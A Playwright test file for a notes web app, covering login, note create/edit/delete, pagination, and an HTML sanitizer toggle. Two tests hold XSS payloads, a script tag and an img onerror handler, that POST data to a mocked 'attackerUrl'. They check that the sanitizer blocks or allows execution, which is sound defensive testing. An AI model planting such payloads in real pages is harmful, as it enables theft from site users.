import { test, expect } from '@playwright/test';

test.beforeEach(async ({ page, request }) => {
  // Log in
  const res = await request.post('http://localhost:3001/login', {
    data: { username: 'y', password: 'yyyy' }
  });
  const { token, user } = await res.json();

  // Set token and user in localStorage
  await page.addInitScript(([token, user]) => {
    window.localStorage.setItem('token', token);
    window.localStorage.setItem('user', JSON.stringify(user));
  }, [token, user]);

  await page.goto('http://localhost:3000');
});

test.describe('Notes App CRUD', () => {
  test('Create a new note', async ({ page }) => {
    await page.addInitScript(() => {
      window.localStorage.removeItem('token');
      window.localStorage.removeItem('user');
    });

    await page.goto('http://localhost:3000');

    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'y');
    await page.fill('[data-testid="login_form_password"]', 'yyyy');
    await page.click('[data-testid="login_form_login"]');

    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    await page.getByRole('button', { name: 'Add New Note' }).click();

    const textbox = page.locator('[data-testid="text_input_new_note"]');
    await textbox.waitFor({ state: 'visible', timeout: 10000 });
    await textbox.fill('Test Note');

    const saveButton = page.locator('[data-testid="text_input_save_new_note"]');
    await saveButton.waitFor({ state: 'visible', timeout: 10000 });
    await saveButton.click();

    const notification = page.locator('.notification');
    await expect(notification).toHaveText('Added a new note', { timeout: 10000 });
  });

  test('Read notes from server', async ({ page }) => {
    const notes = page.locator('.note');
    await expect(notes.first()).toBeVisible();
  
    const firstNoteTitle = notes.first().locator('h2');
    await expect(firstNoteTitle).not.toBeEmpty();
  });

  test('Update an existing note', async ({ page }) => {
    await page.addInitScript(() => {
      window.localStorage.removeItem('token');
      window.localStorage.removeItem('user');
    });

    await page.goto('http://localhost:3000');

    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'y');
    await page.fill('[data-testid="login_form_password"]', 'yyyy');
    await page.click('[data-testid="login_form_login"]');

    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    const editButton = page.locator('[data-testid^="edit-"]').first();
    await editButton.waitFor({ state: 'visible', timeout: 5000 });
    await editButton.click();

    const textarea = page.locator('[data-testid^="text_input-"]').first();
    await textarea.waitFor({ state: 'visible', timeout: 5000 });
    await textarea.fill('Updated Note Content');

    const saveButton = page.locator('[data-testid^="text_input_save-"]').first();
    await saveButton.waitFor({ state: 'visible', timeout: 5000 });
    await saveButton.click();

    const notification = page.locator('.notification');
    await expect(notification).toHaveText('Note updated', { timeout: 5000 });
  });

  test('Delete a note', async ({ page }) => {
    await page.addInitScript(() => {
      window.localStorage.removeItem('token');
      window.localStorage.removeItem('user');
    });

    await page.goto('http://localhost:3000');
    await page.goto('http://localhost:3000/login');
    await page.fill('[data-testid="login_form_username"]', 'y');
    await page.fill('[data-testid="login_form_password"]', 'yyyy');
    await page.click('[data-testid="login_form_login"]');

    await expect(page.locator('[data-testid="logout"]')).toBeVisible({ timeout: 5000 });
    const deleteButton = page.locator('[data-testid^="delete-"]').first();
    await deleteButton.waitFor({ state: 'visible', timeout: 5000 });
    await deleteButton.click();

    const notification = page.locator('.notification');
    await expect(notification).toHaveText('Note deleted', { timeout: 5000 });
  });

  test('Pagination buttons exist', async ({ page }) => {
    await expect(page.getByRole('button', { name: 'First' })).toBeVisible();
    await expect(page.getByRole('button', { name: 'Last' })).toBeVisible();
  });
});

test.describe('Rich Text & XSS/Sanitizer', () => {
  test('Rich text is rendered (b, i, img tags)', async ({ page }) => {
    const uniqueContent = 'Bold-' + Date.now() + ' <b>Bold</b> <i>Italic</i> <img src=x />';
    await page.getByRole('button', { name: 'Add New Note' }).click();
    const textbox = page.locator('[data-testid="text_input_new_note"]');
    await textbox.fill(uniqueContent);
    await page.locator('[data-testid="text_input_save_new_note"]').click();
    const note = page.locator('.note').first();
    const noteContent = note.locator('[data-testid^="note-content-"]');
    await expect(noteContent).toContainText('Bold');
    await expect(noteContent).toContainText('Italic');
    const imgCount = await noteContent.locator('img').count();
    expect(imgCount).toBeGreaterThan(0);
  });

  test('Sanitizer ON blocks XSS (script not executed)', async ({ page }) => {
    const attackerUrl = 'http://localhost:4000/log';

    let requestIntercepted = false;
    await page.route(attackerUrl, route => {
      requestIntercepted = true;
      return route.fulfill({ status: 200 });
    });

    const xssPayload = `<script>
      fetch("${attackerUrl}", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ key: "blocked" }) });
    </script>`;

    await page.getByRole('button', { name: 'Add New Note' }).click();
    await page.locator('[data-testid="text_input_new_note"]').fill(xssPayload);
    await page.locator('[data-testid="text_input_save_new_note"]').click();
    await page.locator('[data-testid="sanitize-on-global"]').click();
    await page.waitForTimeout(1500);

    expect(requestIntercepted).toBe(false);  
  });

 test('Sanitizer OFF allows XSS/keylogger (script runs and sends POST)', async ({ page }) => {
  const attackerUrl = 'http://localhost:4000/log';

  let requestIntercepted = false;
  await page.route(attackerUrl, route => {
    requestIntercepted = true;
    route.fulfill({ status: 200 });
  });

  await page.getByRole('button', { name: 'Add New Note' }).click();

  const xssPayload = `<img src="x" onerror="fetch('${attackerUrl}', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: 'xss-detected' })
  })">`;

  await page.locator('[data-testid="text_input_new_note"]').fill(xssPayload);
  await page.locator('[data-testid="text_input_save_new_note"]').click();

  const note = page.locator('.note').first();
  await page.locator('[data-testid="sanitize-off-global"]').click();

  await page.waitForTimeout(2000);

  expect(requestIntercepted).toBe(true); 
});


});
